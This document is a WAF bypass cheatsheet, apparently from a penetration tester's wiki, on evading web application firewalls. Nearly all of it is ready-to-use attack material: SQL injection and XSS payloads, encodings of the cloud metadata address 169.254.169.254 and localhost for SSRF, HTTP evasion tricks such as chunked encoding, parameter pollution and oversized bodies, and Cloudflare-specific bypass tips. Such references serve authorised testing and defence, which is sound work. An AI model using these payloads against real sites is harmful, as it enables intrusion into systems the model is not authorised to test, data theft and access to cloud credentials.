# WAF Bypass Techniques Cheatsheet

---

## Detect the WAF First

```bash
wafw00f https://example.com

# Manual tells:
# Cloudflare: CF-Ray header, "Sorry, you have been blocked" page
# Akamai: AkamaiGHost in Server header
# Imperva: incap_ses_ cookie
# AWS WAF: x-amz-cf-id header
# F5 BIG-IP: BIGipServer cookie
```

---

## Universal Bypass Techniques

### Case Variation

```
<ScRiPt>alert(1)</ScRiPt>
UNION SELECT → UnIoN SeLeCt
SELECT → SeLeCt
```

### URL Encoding

```
< = %3C
> = %3E
' = %27
" = %22
space = %20 or +
/ = %2F
```

### Double URL Encoding

```
%3C = %253C (second encoding)
%27 = %2527
```

### Unicode / HTML Entities

```html
&#60;script&#62;  (decimal)
&#x3C;script&#x3E;  (hex)
<script>  (unicode in JS context)
```

### Whitespace Substitution

```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users   (tab)
SELECT%0Ausername%0AFROM%0Ausers   (newline)
SELECT%0Dusername%0DFROM%0Dusers   (carriage return)
```

---

## SQLi WAF Bypasses

```sql
-- Comment variations
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR 1=1/*!*/

-- Keyword bypass
UNION SELECT → UnIoN/**/SeLeCt
SELECT → SEL/**/ECT
WHERE → WH/**/ERE

-- Inline comment bypass
' /*!UNION*/ /*!SELECT*/ 1,2,3--

-- String concatenation (MySQL)
'test' = 'te'+'st'
CHAR(116,101,115,116)

-- Space-free payloads
'OR(1)=(1)--
'OR(1)=1--
```

---

## XSS WAF Bypasses

```html
<!-- Tag alternatives -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>

<!-- Encoding in attributes -->
<a href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)>

<!-- Script in SVG -->
<svg><script>alert(1)</script></svg>

<!-- Data URI -->
<iframe src="data:text/html,<script>alert(1)</script>">
```

---

## SSRF WAF Bypasses

```
169.254.169.254    → 2852039166 (decimal)
169.254.169.254    → 0xa9fea9fe (hex)
169.254.169.254    → 0251.0376.0251.0376 (octal)
127.0.0.1          → 2130706433 (decimal)
127.0.0.1          → 127.1 (shorthand)
127.0.0.1          → 0x7f000001 (hex)
```

---

## HTTP-Level Bypasses

### Chunked Transfer Encoding

WAFs often don't fully inspect chunked request bodies:

```
POST /login HTTP/1.1
Transfer-Encoding: chunked

5
user=
9
admin&pw=
6
pass12
0
```

### HTTP Parameter Pollution

```
GET /search?q=hello&q=<script>alert(1)</script>
# WAF may check first param, app uses last
```

### Method Override

```
POST /endpoint
X-HTTP-Method-Override: PUT
# WAF may not check PUT payloads on POST requests
```

### Large Body

Some WAFs stop inspecting after a threshold:

```
name=AAAA....[20000 chars]...AAAA<script>alert(1)</script>
```

### Content-Type Switching

```
# WAF tuned for application/json
Content-Type: text/plain
# or
Content-Type: application/x-www-form-urlencoded
```

---

## Cloudflare Specific

```
# Cloudflare generally blocks:
# - Classic XSS tags
# - Common SQLi patterns
# - Known CVE signatures

# Bypasses that have worked historically:
# - SVG onload payloads
# - Lowercase/mixed case SQLi
# - URL-encoded payloads
# - Long payloads to exceed inspection limit
# - Targeting endpoints with ?waf_bypass_header (some have special rules)
```

---

*Related: [[XSS-Filter-Bypass]] | [[SSRF-Bypass]] | [[SQLi-Payloads]]*
